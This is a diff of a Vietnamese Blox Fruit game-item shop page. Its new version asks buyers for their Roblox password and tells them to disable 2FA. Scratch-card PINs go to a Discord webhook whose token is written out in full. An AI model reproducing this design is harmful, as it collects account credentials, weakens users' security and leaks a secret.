@@ -3,185 +3,155 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SHOP BẮP - BLOX FRUIT CHÍNH THỨC</title>
+    <title>SHOP BẮP - BLOX FRUIT Uy Tín</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@700&family=Pacifico&display=swap" rel="stylesheet">
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <style>
-        body { background: #0b1120; font-family: 'Quicksand', sans-serif; color: #fff; overflow-x: hidden; }
-        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; }
-        .btn-main { background: linear-gradient(90deg, #facc15, #eab308); color: #000; font-weight: bold; transition: 0.2s; cursor: pointer; border: none; }
-        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(250, 204, 21, 0.4); }
-        .btn-discord { background: #5865F2; color: white; font-weight: bold; }
-        input, select { background: #1a2236 !important; border: 1px solid #334155 !important; color: #fff !important; border-radius: 12px; padding: 12px; font-size: 14px; outline: none; }
-        .logo-brand { width: 55px; height: 55px; border-radius: 50%; border: 2px solid #facc15; object-fit: cover; }
-        .tab-active { background: #facc15 !important; color: #000 !important; }
-        .qr-container { background: #fff; padding: 12px; border-radius: 20px; display: inline-block; }
-        ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
+        body { background: #0b1120; font-family: 'Quicksand', sans-serif; color: #fff; scroll-behavior: smooth; }
+        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 25px; transition: 0.3s; }
+        .glass:hover { border-color: #facc15; }
+        .btn-main { background: linear-gradient(90deg, #facc15, #eab308); color: #000; font-weight: 800; transition: 0.3s; }
+        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(250, 204, 21, 0.4); }
+        .nap-box { border: 2px solid #facc15; border-radius: 35px; background: rgba(250, 204, 21, 0.03); padding: 25px; }
+        select, input, textarea { background: #1a2236 !important; border: 1px solid #334155 !important; color: #fff !important; border-radius: 12px; padding: 14px; width: 100%; outline: none; }
+        .tab-btn { transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); }
+        .tab-active { background: #facc15 !important; color: #000 !important; border-color: #facc15; }
+        .badge { background: red; color: white; padding: 2px 8px; border-radius: 5px; font-size: 10px; position: absolute; top: -10px; right: -5px; }
     </style>
 </head>
 <body>
-    <nav class="sticky top-0 z-50 bg-[#0b1120]/95 border-b border-white/5 p-4 shadow-xl">
-        <div class="max-w-6xl mx-auto flex justify-between items-center">
+    <nav class="p-4 border-b border-white/5 bg-[#0b1120]/95 sticky top-0 z-50 shadow-xl">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
             <div class="flex items-center gap-3">
-                <img src="https://i.postimg.cc/8fg7BFnL/image.jpg" class="logo-brand">
-                <h1 class="text-2xl font-['Pacifico'] text-yellow-400">Shop Bắp</h1>
-            </div>
-            <div class="flex items-center gap-3">
-                <a href="https://discord.gg/YOUR_LINK" target="_blank" class="btn-discord px-4 py-2 rounded-xl text-[10px] uppercase flex items-center gap-2 shadow-lg">Discord</a>
-                <div id="user-display">
-                    <button onclick="login()" class="btn-main px-5 py-2 rounded-xl text-[10px] uppercase">Đăng nhập</button>
+                <img src="https://i.postimg.cc/8fg7BFnL/image.jpg" class="w-12 h-12 rounded-full border-2 border-yellow-400 shadow-[0_0_15px_rgba(250,204,21,0.5)]">
+                <div>
+                    <span class="text-2xl font-['Pacifico'] text-yellow-400 block leading-none">Shop Bắp</span>
+                    <span class="text-[9px] uppercase tracking-[3px] opacity-50">Blox Fruit Service</span>
                 </div>
+            </div>
+            <div id="user-display" class="flex gap-3">
+                <button onclick="alert('Tính năng đang bảo trì!')" class="text-[10px] font-bold opacity-60 uppercase">Đăng Nhập</button>
+                <button onclick="alert('Tính năng đang bảo trì!')" class="btn-main px-6 py-2 rounded-xl text-[10px] uppercase">Đăng Ký</button>
             </div>
         </div>
     </nav>
 
-    <div class="max-w-6xl mx-auto p-4 mt-6 grid grid-cols-1 lg:grid-cols-12 gap-8">
-        <div class="lg:col-span-4 space-y-6">
-            <div id="qr-section" class="glass p-6 border-t-4 border-blue-500 text-center hidden">
-                <h3 class="text-blue-400 font-bold mb-1 uppercase text-xs tracking-widest">🏧 NẠP QUA BANK / VÍ</h3>
-                <p class="text-[10px] text-green-400 mb-4 font-bold uppercase">Ưu đãi: 10k nhận 10k (0% Thuế)</p>
-                
-                <div class="qr-container mb-4">
-                    <img src="https://i.postimg.cc/8fg7BFnL/image.jpg" class="w-64 h-auto mx-auto rounded-lg shadow-xl">
-                </div>
-
-                <div class="text-[12px] bg-black/40 p-4 rounded-2xl space-y-2 border border-white/10 text-left">
-                    <p class="flex justify-between"><span>Ngân hàng:</span> <b class="text-blue-400">MB BANK</b></p>
-                    <p class="flex justify-between"><span>Số tài khoản:</span> <b class="text-white">0352219463</b></p>
-                    <p class="flex justify-between"><span>Chủ TK:</span> <b class="text-white uppercase">NGUYEN TRONG NGHIA</b></p>
-                    <div class="mt-4 p-3 bg-yellow-400/10 border border-yellow-400/20 rounded-xl">
-                        <p class="text-[10px] text-yellow-400 mb-1 font-bold uppercase">Nội dung chuyển khoản:</p>
-                        <div id="qr-memo" class="text-yellow-400 font-extrabold text-sm tracking-wider"></div>
-                    </div>
+    <div class="max-w-7xl mx-auto p-4 mt-8 grid grid-cols-1 lg:grid-cols-12 gap-8">
+        
+        <div class="lg:col-span-4 space-y-8">
+            <div class="nap-box shadow-[0_0_30px_rgba(0,0,0,0.5)]">
+                <h2 class="text-center font-black text-sm mb-6 uppercase tracking-tighter flex items-center justify-center gap-2">
+                    <span class="text-yellow-400">💳 NẠP THẺ CÀO</span> <span class="bg-yellow-400 text-black px-2 py-0.5 rounded text-[10px]">Tỉ lệ 0.8</span>
+                </h2>
+                <div class="space-y-4">
+                    <select id="card-telco" class="font-bold">
+                        <option>VIETTEL</option><option>VINAPHONE</option><option>MOBIFONE</option><option>ZING</option>
+                    </select>
+                    <select id="card-val" class="font-bold text-yellow-400">
+                        <option value="10000">10,000đ -> Nhận 8,000đ</option>
+                        <option value="20000">20,000đ -> Nhận 16,000đ</option>
+                        <option value="50000">50,000đ -> Nhận 40,000đ</option>
+                        <option value="100000">100,000đ -> Nhận 80,000đ</option>
+                        <option value="200000">200,000đ -> Nhận 160,000đ</option>
+                        <option value="500000">500,000đ -> Nhận 400,000đ</option>
+                        <option value="1000000">1,000,000đ -> Nhận 800,000đ</option>
+                    </select>
+                    <input type="text" id="card-pin" placeholder="Mã thẻ (PIN)...">
+                    <input type="text" id="card-seri" placeholder="Số Seri thẻ...">
+                    <button onclick="handleCard()" class="btn-main w-full py-4 rounded-2xl uppercase text-xs shadow-lg">Gửi Thẻ Chờ Duyệt</button>
+                    <p class="text-[9px] text-gray-500 text-center uppercase font-bold tracking-widest mt-2 italic">* Chậm nhất 5 phút sẽ có tiền *</p>
                 </div>
             </div>
 
-            <div class="glass p-6 border-t-4 border-yellow-500">
-                <h3 class="text-yellow-400 font-bold mb-4 uppercase text-[11px] tracking-widest text-center">💳 NẠP THẺ CÀO (TỈ LỆ 0.8)</h3>
-                <div class="space-y-4 flex flex-col">
-                    <select id="card-telco">
-                        <option>VIETTEL</option>
-                        <option>VINAPHONE</option>
-                        <option>MOBIFONE</option>
-                        <option>ZING</option>
-                    </select>
-                    <select id="card-val">
-                        <option value="10000|8000">10,000đ -> Nhận 8,000đ</option>
-                        <option value="20000|16000">20,000đ -> Nhận 16,000đ</option>
-                        <option value="30000|24000">30,000đ -> Nhận 24,000đ</option>
-                        <option value="50000|40000">50,000đ -> Nhận 40,000đ</option>
-                        <option value="100000|80000">100,000đ -> Nhận 80,000đ</option>
-                        <option value="200000|160000">200,000đ -> Nhận 160,000đ</option>
-                        <option value="300000|240000">300,000đ -> Nhận 240,000đ</option>
-                        <option value="500000|400000">50,000đ -> Nhận 400,000đ</option>
-                        <option value="1000000|800000">1,000,000đ -> Nhận 800,000đ</option>
-                    </select>
-                    <div class="space-y-2">
-                        <input type="text" id="card-pin" class="w-full" placeholder="Mã thẻ (PIN)...">
-                        <input type="text" id="card-seri" class="w-full" placeholder="Số Seri thẻ...">
-                    </div>
-                    <button onclick="sendCard()" class="btn-main py-3 rounded-xl uppercase text-xs">Gửi Thẻ Chờ Duyệt</button>
-                    <p class="text-[9px] text-gray-500 text-center italic">* Chọn sai mệnh giá sẽ không được cộng tiền.</p>
+            <div class="glass p-6 border-t-4 border-blue-500 relative overflow-hidden">
+                <div class="absolute top-2 right-2 rotate-12 opacity-10"><i class="text-6xl">🏧</i></div>
+                <h2 class="font-bold text-xs mb-4 uppercase text-blue-400 flex items-center gap-2">🏧 Nạp Qua Bank (QR Tự Động)</h2>
+                <div id="qr-container" class="hidden bg-white p-3 rounded-2xl mb-4 animate-pulse">
+                    <img id="qr-code" src="" class="w-full">
+                    <p class="text-black text-center text-[10px] font-bold mt-2 uppercase">Quét mã để nạp tiền</p>
                 </div>
+                <div class="text-[10px] space-y-2 bg-black/40 p-4 rounded-2xl border border-white/5">
+                    <p class="flex justify-between"><span>Bank:</span> <b class="text-white">MB BANK</b></p>
+                    <p class="flex justify-between"><span>Số TK:</span> <b class="text-white">0352219463</b></p>
+                    <p class="flex justify-between"><span>Tên:</span> <b class="text-white">TRAN NGHIA</b></p>
+                    <p class="flex justify-between"><span>Nội dung:</span> <b class="text-yellow-400">NAP BAP NGHIA</b></p>
+                </div>
+                <button onclick="showQR()" class="w-full bg-blue-600 hover:bg-blue-500 mt-4 py-3 rounded-xl font-bold text-[10px] uppercase transition shadow-lg">Hiện Mã QR Nạp Nhanh ⚡</button>
             </div>
         </div>
 
         <div class="lg:col-span-8">
-            <div class="flex gap-2 mb-6 overflow-x-auto pb-2 scrollbar-hide">
-                <button onclick="render('fruit')" class="tab-btn px-6 py-3 bg-white/5 rounded-2xl font-bold text-[10px] uppercase tab-active border border-white/5">🍎 Trái Ác Quỷ VV</button>
-                <button onclick="render('gp')" class="tab-btn px-6 py-3 bg-white/5 rounded-2xl font-bold text-[10px] uppercase border border-white/5">🎫 Gamepass</button>
-                <button onclick="render('ct')" class="tab-btn px-6 py-3 bg-white/5 rounded-2xl font-bold text-[10px] uppercase border border-white/5">⚔️ Cày Thuê</button>
+            <div class="flex gap-3 mb-8 overflow-x-auto pb-2 scrollbar-hide">
+                <button onclick="renderShop('fruit')" id="tab-fruit" class="tab-btn px-6 py-4 glass rounded-2xl text-[10px] font-bold uppercase whitespace-nowrap tab-active relative">🍎 Trái Vĩnh Viễn <span class="badge">HOT</span></button>
+                <button onclick="renderShop('gp')" id="tab-gp" class="tab-btn px-6 py-4 glass rounded-2xl text-[10px] font-bold uppercase whitespace-nowrap">🎫 Gamepass</button>
+                <button onclick="renderShop('ct')" id="tab-ct" class="tab-btn px-6 py-4 glass rounded-2xl text-[10px] font-bold uppercase whitespace-nowrap">⚔️ Cày Thuê</button>
             </div>
-            <div id="shop-grid" class="grid grid-cols-2 md:grid-cols-3 gap-4"></div>
+
+            <div id="main-grid" class="grid grid-cols-2 md:grid-cols-3 gap-6">
+                </div>
+        </div>
+    </div>
+
+    <div id="buy-modal" class="fixed inset-0 bg-black/95 hidden z-[100] flex items-center justify-center p-4 backdrop-blur-md">
+        <div class="glass p-8 w-full max-w-md border-yellow-500/30">
+            <h2 id="m-name" class="text-2xl font-black text-yellow-400 mb-1 uppercase text-center italic"></h2>
+            <p id="m-price" class="text-center text-sm font-bold text-gray-400 mb-8 tracking-[2px]"></p>
+            <div class="space-y-4">
+                <input type="text" id="rb-acc" placeholder="Tên tài khoản Roblox...">
+                <input type="text" id="rb-pass" placeholder="Mật khẩu Roblox...">
+                <textarea id="rb-note" rows="3" placeholder="Ghi chú (Lv, Tộc, Trái đang dùng,...)"></textarea>
+                <div class="bg-red-500/10 p-3 rounded-xl border border-red-500/20 mb-4">
+                    <p class="text-[9px] text-red-400 text-center italic">* Vui lòng tắt 2FA (Mã bảo mật) để Nghĩa vào acc nhanh hơn!</p>
+                </div>
+                <button onclick="submitOrder()" class="btn-main w-full py-4 rounded-2xl uppercase text-xs">Xác Nhận Thanh Toán</button>
+                <button onclick="closeModal()" class="w-full text-[10px] opacity-30 uppercase mt-4 tracking-widest">Đóng Cửa Sổ</button>
+            </div>
         </div>
     </div>
 
     <script>
-        // Cấu hình Firebase của Nghĩa
-        const firebaseConfig = { databaseURL: "https://shop-blox-fruit-trannghia-default-rtdb.firebaseio.com/" };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-
-        // DÁN WEBHOOK DISCORD CỦA NGHĨA VÀO ĐÂY
+        // --- CẤU HÌNH WEBHOOK NGHĨA ---
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1467138431380623615/KxzLu2aos7455VXv-qOogLkoTC-c1XBJH7bJawv2eblGrxyY6vRDxVsBCdziIuOUB6g3";
 
-        let user = localStorage.getItem('bap_user');
-        let userKey = localStorage.getItem('bap_key');
-
-        function sendDiscord(msg) {
-            if(!WEBHOOK_URL || WEBHOOK_URL.includes("DÁN_LINK")) return;
-            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: msg }) });
-        }
-
-        function login() {
-            let n = prompt("Nhập tên hiển thị (Ví dụ: NghiaPro):");
-            if(!n) return;
-            let key = btoa(unescape(encodeURIComponent(n))).replace(/[/+=]/g, "");
-            db.ref('users/' + key).once('value', s => {
-                if(!s.exists()) db.ref('users/' + key).set({ displayName: n, balance: 0 });
-                localStorage.setItem('bap_user', n);
-                localStorage.setItem('bap_key', key);
-                location.reload();
-            });
-        }
-
-        if(userKey) {
-            db.ref('users/' + userKey).on('value', s => {
-                let d = s.val() || { balance: 0, displayName: user };
-                document.getElementById('user-display').innerHTML = `
-                    <div class="flex items-center gap-3">
-                        <div class="text-right leading-none">
-                            <p class="text-[10px] text-gray-400 uppercase font-bold">${d.displayName}</p>
-                            <p class="text-yellow-400 font-bold text-lg">${d.balance.toLocaleString()}đ</p>
-                        </div>
-                        <button onclick="localStorage.clear();location.reload()" class="bg-red-500/10 p-2 rounded-lg text-xs hover:bg-red-500/20">❌</button>
-                    </div>`;
-                document.getElementById('qr-section').classList.remove('hidden');
-                document.getElementById('qr-memo').innerText = "NAP BAP " + userKey;
-            });
-        }
-
+        // --- DATA ĐẦY ĐỦ DỊCH VỤ ---
         const shopData = {
-            fruit: [
-                {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
-                {n:"Dragon VV", p:750000, img:"https://i.postimg.cc/CLB3KS1g/Anh-chup-man-hinh-2026-01-28-113307.png"},
-                {n:"Control VV", p:690000, img:"https://i.postimg.cc/qvnH14V7/Anh-chup-man-hinh-2026-01-28-113219.png"},
-                {n:"Yeti VV", p:562000, img:"https://i.postimg.cc/dQxMvLJB/Anh-chup-man-hinh-2026-01-28-113255.png"},
-                {n:"Tiger VV", p:562000, img:"https://i.postimg.cc/3NycWF3C/Anh-chup-man-hinh-2026-01-28-113337.png"},
-                {n:"Spirit VV", p:463000, img:"https://i.postimg.cc/T1ZHb5PJ/Anh-chup-man-hinh-2026-01-28-113348.png"},
-                {n:"Gas VV", p:452000, img:"https://i.postimg.cc/L6crYwY5/Anh-chup-man-hinh-2026-01-28-113319.png"},
-                {n:"Venom VV", p:450000, img:"https://i.postimg.cc/kGtT7My6/Anh-chup-man-hinh-2026-01-28-113414.png"},
-                {n:"Mochi (Dough) VV", p:444000, img:"https://i.postimg.cc/gj6gGcKM/Anh-chup-man-hinh-2026-01-28-113428.png"},
-                {n:"Shadow VV", p:441000, img:"https://i.postimg.cc/QCWfjNqQ/Anh-chup-man-hinh-2026-01-28-113419.png"},
-                {n:"T-Rex VV", p:420000, img:"https://i.postimg.cc/CMt2XX4m/Anh-chup-man-hinh-2026-01-28-113355.png"},
-                {n:"Mammoth VV", p:420000, img:"https://i.postimg.cc/MKQLS5Pp/Anh-chup-man-hinh-2026-01-28-113409.png"},
-                {n:"Gravity VV", p:408000, img:"https://i.postimg.cc/zv39K1FV/Anh-chup-man-hinh-2026-01-28-113238.png"},
-                {n:"Blizzard VV", p:390000, img:"https://i.postimg.cc/5yLMm4SM/Anh-chup-man-hinh-2026-01-28-165200.png"},
-                {n:"Pain VV", p:350000, img:"https://i.postimg.cc/NMGhGXyx/Anh-chup-man-hinh-2026-01-28-113228.png"},
-                {n:"Lightning VV", p:350000, img:"https://i.postimg.cc/2yB0Cjxg/Anh-chup-man-hinh-2026-01-28-113433.png"},
-                {n:"Sound VV", p:310000, img:"https://i.postimg.cc/pLZbwkrN/Anh-chup-man-hinh-2026-01-28-113451.png"},
-                {n:"Love VV", p:300000, img:"https://i.postimg.cc/FHZ5MGzf/Anh-chup-man-hinh-2026-01-28-113457.png"},
-                {n:"Creation VV", p:286000, img:"https://i.postimg.cc/d3Xg9S5x/Anh-chup-man-hinh-2026-01-28-113244.png"},
-                {n:"Portal VV", p:250000, img:"https://i.postimg.cc/Z5ZzsXTM/Anh-chup-man-hinh-2026-01-28-113439.png"},
-                {n:"Phật Tổ VV", p:250000, img:"https://i.postimg.cc/tCQK78V7/Anh-chup-man-hinh-2026-01-28-113501.png"},
-                {n:"Phoenix VV", p:250000, img:"https://i.postimg.cc/0yx1Xhkg/Anh-chup-man-hinh-2026-01-28-113443.png"},
-                {n:"Spider VV", p:210000, img:"https://i.postimg.cc/Vk1PZ2f1/Anh-chup-man-hinh-2026-01-28-113448.png"},
-                {n:"Quake VV", p:210000, img:"https://i.postimg.cc/CLT3d9fn/Anh-chup-man-hinh-2026-01-28-113506.png"},
-                {n:"Ghost VV", p:150000, img:"https://i.postimg.cc/rFXBz7tx/Anh-chup-man-hinh-2026-01-28-113510.png"},
-                {n:"Magma VV", p:150000, img:"https://i.postimg.cc/m2Y09VQF/Anh-chup-man-hinh-2026-01-28-113517.png"},
-                {n:"Dark VV", p:130000, img:"https://i.postimg.cc/3wc6hqTH/Anh-chup-man-hinh-2026-01-28-113540.png"},
-                {n:"Diamond VV", p:120000, img:"https://i.postimg.cc/HswfM3Q3/Anh-chup-man-hinh-2026-01-28-113522.png"},
-                {n:"Light VV", p:120000, img:"https://i.postimg.cc/W43KQvxy/Anh-chup-man-hinh-2026-01-28-113530.png"},
-                {n:"Ice VV", p:110000, img:"https://i.postimg.cc/YSsV7PH9/Anh-chup-man-hinh-2026-01-28-113545.png"},
-                {n:"Eagle VV", p:111000, img:"https://i.postimg.cc/MGF4wLSc/Anh-chup-man-hinh-2026-01-28-113550.png"},
-                {n:"Sand VV", p:100000, img:"https://i.postimg.cc/ZqMgmQhQ/Anh-chup-man-hinh-2026-01-28-113534.png"},
-                {n:"Flame VV", p:100000, img:"https://i.postimg.cc/8zyXdYst/Anh-chup-man-hinh-2026-01-28-113555.png"},
-                {n:"Blade VV", p:20000, img:"https://i.postimg.cc/BvXYmC1p/Anh-chup-man-hinh-2026-01-28-113602.png"}
-            ],
-            gp: [
+                        fruit: [
+    {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
+    {n:"Dragon VV", p:750000, img:"https://i.postimg.cc/CLB3KS1g/Anh-chup-man-hinh-2026-01-28-113307.png"},
+    {n:"Control VV", p:690000, img:"https://i.postimg.cc/qvnH14V7/Anh-chup-man-hinh-2026-01-28-113219.png"},
+    {n:"Yeti VV", p:562000, img:"https://i.postimg.cc/dQxMvLJB/Anh-chup-man-hinh-2026-01-28-113255.png"},
+    {n:"Tiger VV", p:562000, img:"https://i.postimg.cc/3NycWF3C/Anh-chup-man-hinh-2026-01-28-113337.png"},
+    {n:"Spirit VV", p:463000, img:"https://i.postimg.cc/T1ZHb5PJ/Anh-chup-man-hinh-2026-01-28-113348.png"},
+    {n:"Gas VV", p:452000, img:"https://i.postimg.cc/L6crYwY5/Anh-chup-man-hinh-2026-01-28-113319.png"},
+    {n:"Venom VV", p:450000, img:"https://i.postimg.cc/kGtT7My6/Anh-chup-man-hinh-2026-01-28-113414.png"},
+    {n:"Mochi (Dough) VV", p:444000, img:"https://i.postimg.cc/gj6gGcKM/Anh-chup-man-hinh-2026-01-28-113428.png"},
+    {n:"Shadow VV", p:441000, img:"https://i.postimg.cc/QCWfjNqQ/Anh-chup-man-hinh-2026-01-28-113419.png"},
+    {n:"T-Rex VV", p:420000, img:"https://i.postimg.cc/CMt2XX4m/Anh-chup-man-hinh-2026-01-28-113355.png"},
+    {n:"Mammoth VV", p:420000, img:"https://i.postimg.cc/MKQLS5Pp/Anh-chup-man-hinh-2026-01-28-113409.png"},
+    {n:"Gravity VV", p:408000, img:"https://i.postimg.cc/zv39K1FV/Anh-chup-man-hinh-2026-01-28-113238.png"},
+    {n:"Blizzard VV", p:390000, img:"https://i.postimg.cc/5yLMm4SM/Anh-chup-man-hinh-2026-01-28-165200.png"},
+    {n:"Pain VV", p:350000, img:"https://i.postimg.cc/NMGhGXyx/Anh-chup-man-hinh-2026-01-28-113228.png"},
+    {n:"Lightning VV", p:350000, img:"https://i.postimg.cc/2yB0Cjxg/Anh-chup-man-hinh-2026-01-28-113433.png"},
+    {n:"Sound VV", p:310000, img:"https://i.postimg.cc/pLZbwkrN/Anh-chup-man-hinh-2026-01-28-113451.png"},
+    {n:"Love VV", p:300000, img:"https://i.postimg.cc/FHZ5MGzf/Anh-chup-man-hinh-2026-01-28-113457.png"},
+    {n:"Creation VV", p:286000, img:"https://i.postimg.cc/d3Xg9S5x/Anh-chup-man-hinh-2026-01-28-113244.png"},
+    {n:"Portal VV", p:250000, img:"https://i.postimg.cc/Z5ZzsXTM/Anh-chup-man-hinh-2026-01-28-113439.png"},
+    {n:"Phật Tổ VV", p:250000, img:"https://i.postimg.cc/tCQK78V7/Anh-chup-man-hinh-2026-01-28-113501.png"},
+    {n:"Phoenix VV", p:250000, img:"https://i.postimg.cc/0yx1Xhkg/Anh-chup-man-hinh-2026-01-28-113443.png"},
+    {n:"Spider VV", p:210000, img:"https://i.postimg.cc/Vk1PZ2f1/Anh-chup-man-hinh-2026-01-28-113448.png"},
+    {n:"Quake VV", p:210000, img:"https://i.postimg.cc/CLT3d9fn/Anh-chup-man-hinh-2026-01-28-113506.png"},
+    {n:"Ghost VV", p:150000, img:"https://i.postimg.cc/rFXBz7tx/Anh-chup-man-hinh-2026-01-28-113510.png"},
+    {n:"Magma VV", p:150000, img:"https://i.postimg.cc/m2Y09VQF/Anh-chup-man-hinh-2026-01-28-113517.png"},
+    {n:"Dark VV", p:130000, img:"https://i.postimg.cc/3wc6hqTH/Anh-chup-man-hinh-2026-01-28-113540.png"},
+    {n:"Diamond VV", p:120000, img:"https://i.postimg.cc/HswfM3Q3/Anh-chup-man-hinh-2026-01-28-113522.png"},
+    {n:"Light VV", p:120000, img:"https://i.postimg.cc/W43KQvxy/Anh-chup-man-hinh-2026-01-28-113530.png"},
+    {n:"Ice VV", p:110000, img:"https://i.postimg.cc/YSsV7PH9/Anh-chup-man-hinh-2026-01-28-113545.png"},
+    {n:"Eagle VV", p:111000, img:"https://i.postimg.cc/MGF4wLSc/Anh-chup-man-hinh-2026-01-28-113550.png"},
+    {n:"Sand VV", p:100000, img:"https://i.postimg.cc/ZqMgmQhQ/Anh-chup-man-hinh-2026-01-28-113534.png"},
+    {n:"Flame VV", p:100000, img:"https://i.postimg.cc/8zyXdYst/Anh-chup-man-hinh-2026-01-28-113555.png"},
+    {n:"Blade VV", p:20000, img:"https://i.postimg.cc/BvXYmC1p/Anh-chup-man-hinh-2026-01-28-113602.png"}
+],
+                gp: [
                 {n:"Fruit Notifier", p:370000, img:"https://i.postimg.cc/VNdGKFbx/Anh-chup-man-hinh-2026-01-28-113608.png"},
                 {n:"Dark Blade", p:200000, img:"https://i.postimg.cc/d0LH59yQ/Anh-chup-man-hinh-2026-01-28-113612.png"},
                 {n:"X2 Mastery VV", p:54000, img:"https://i.postimg.cc/44z82ym7/Anh-chup-man-hinh-2026-01-28-113623.png"},
@@ -190,56 +160,88 @@
                 {n:"X2 Drop VV", p:40000, img:"https://i.postimg.cc/PrTSgHwD/Anh-chup-man-hinh-2026-01-28-113631.png"},
                 {n:"Fast Boat VV", p:40000, img:"https://i.postimg.cc/HkLBLt3Y/Anh-chup-man-hinh-2026-01-28-113635.png"}
             ],
-            ct: [
+           ct: [
                 {n:"Cày Thuê Level 1-2800", p:20000},
-                {n:"Lấy Võ V2 (Full Chiêu)", p:30000},
-                {n:"Thức Tỉnh Trái V2 (Lửa/Chấn)", p:20000},
-                {n:"Thức Tỉnh Trái V2 (Dough/Phật)", p:30000},
-                {n:"Up Tộc V4 Full Gare", p:50000},
-                {n:"Lấy Song Kiếm Cursed Dual", p:50000}
+                {n:"Lấy Võ V2 (Tặng Full Chiêu)", p:30000},
+                {n:"Thức Tỉnh Trái V2 (Lửa-Chấn Động)", p:20000},
+                {n:"Thức Tỉnh Trái V2 (Dough-Phật)", p:30000},
+                {n:"Up V4 Full Gare", p:50000},
+                {n:"Lấy Song Kiếm Full", p:50000}
             ]
         };
 
-        function render(t) {
+        let picking = {};
+
+        function renderShop(tab) {
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active'));
-            if(event) event.target.classList.add('tab-active');
-            document.getElementById('shop-grid').innerHTML = shopData[t].map(i => `
-                <div class="glass p-4 text-center flex flex-col justify-between border border-white/5 hover:border-yellow-500/50 transition duration-300 shadow-lg">
-                    ${i.img ? `<img src="${i.img}" class="h-24 mx-auto mb-2 object-contain drop-shadow-2xl">` : `<div class="h-24 flex items-center justify-center text-4xl">⚔️</div>`}
-                    <div>
-                        <h4 class="text-[10px] font-bold uppercase mb-1 leading-tight text-gray-200">${i.n}</h4>
-                        <p class="text-yellow-400 font-bold mb-3">${i.p.toLocaleString()}đ</p>
-                    </div>
-                    <button onclick="buy('${i.n}', ${i.p})" class="btn-main w-full py-2.5 rounded-xl text-[10px] uppercase">Mua Ngay</button>
-                </div>`).join('');
+            document.getElementById('tab-' + tab).classList.add('tab-active');
+            
+            const grid = document.getElementById('main-grid');
+            grid.innerHTML = shopData[tab].map(i => `
+                <div class="glass p-6 text-center group">
+                    <div class="text-5xl mb-4 group-hover:scale-125 transition duration-500">${i.img}</div>
+                    <h3 class="text-[11px] font-black uppercase mb-1 tracking-tight">${i.n}</h3>
+                    <p class="text-yellow-400 font-bold text-lg mb-5">${i.p.toLocaleString()}đ</p>
+                    <button onclick="openBuy('${i.n}', ${i.p})" class="btn-main w-full py-3 rounded-xl text-[10px] uppercase">Mua Ngay</button>
+                </div>
+            `).join('');
         }
 
-        function buy(n, p) {
-            if(!userKey) return alert("Bạn hãy Đăng nhập để mua hàng nhé!");
-            db.ref('users/' + userKey).once('value', s => {
-                let bal = s.val().balance || 0;
-                if(bal < p) return alert("Số dư không đủ. Hãy nạp thêm Bank hoặc Thẻ cào!");
-                let info = prompt("Nhập Tên Nhân Vật / Tài Khoản Blox Fruit:");
-                if(!info) return;
-                db.ref('users/' + userKey).update({ balance: bal - p });
-                db.ref('orders').push({ user, item: n, info, time: new Date().toLocaleString() });
-                sendDiscord(`🛒 **ĐƠN HÀNG MỚI!**\n- Khách: ${user}\n- Mua: ${n}\n- Thông tin: ${info}`);
-                alert("Đặt hàng thành công! Nghĩa sẽ xử lý cho bạn ngay.");
-            });
+        function showQR() {
+            const memo = "NAP BAP NGHIA";
+            const url = `https://img.vietqr.io/image/MB-0352219463-compact2.png?amount=50000&addInfo=${encodeURIComponent(memo)}&accountName=TRAN%20NGHIA`;
+            document.getElementById('qr-code').src = url;
+            document.getElementById('qr-container').classList.remove('hidden');
         }
 
-        function sendCard() {
-            if(!userKey) return alert("Hãy đăng nhập để nạp thẻ!");
-            let [v, r] = document.getElementById('card-val').value.split('|');
-            let pin = document.getElementById('card-pin').value, seri = document.getElementById('card-seri').value;
-            let telco = document.getElementById('card-telco').value;
-            if(!pin || !seri) return alert("Vui lòng điền đầy đủ PIN và Seri thẻ!");
-            db.ref('napthe').push({ user, userKey, telco, real: r, pin, seri, status: "Chờ duyệt" });
-            sendDiscord(`💳 **CÓ THẺ MỚI CẦN DUYỆT!**\n- Khách: ${user}\n- Loại: ${telco}\n- Mệnh giá: ${v}đ\n- PIN: ${pin}\n- Seri: ${seri}`);
-            alert("Gửi thẻ thành công! Vui lòng chờ Nghĩa kiểm tra.");
+        function handleCard() {
+            const pin = document.getElementById('card-pin').value, seri = document.getElementById('card-seri').value;
+            const telco = document.getElementById('card-telco').value, val = document.getElementById('card-val').value;
+            if(!pin || !seri) return alert("Vui lòng điền đủ PIN và SERI thẻ!");
+
+            const content = `💳 **THÔNG BÁO NẠP THẺ (Tỉ lệ 0.8)**\n` +
+                            `──────────────────\n` +
+                            `🔥 Nhà mạng: **${telco}**\n` +
+                            `💵 Mệnh giá: **${Number(val).toLocaleString()}đ**\n` +
+                            `💰 **TIỀN CẦN CỘNG: ${(val*0.8).toLocaleString()}đ**\n` +
+                            `🔑 PIN: \`${pin}\`\n` +
+                            `🔒 SERI: \`${seri}\`\n` +
+                            `──────────────────`;
+            
+            fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content }) });
+            alert("Đã gửi thẻ thành công! Đợi Nghĩa duyệt từ 1-5 phút.");
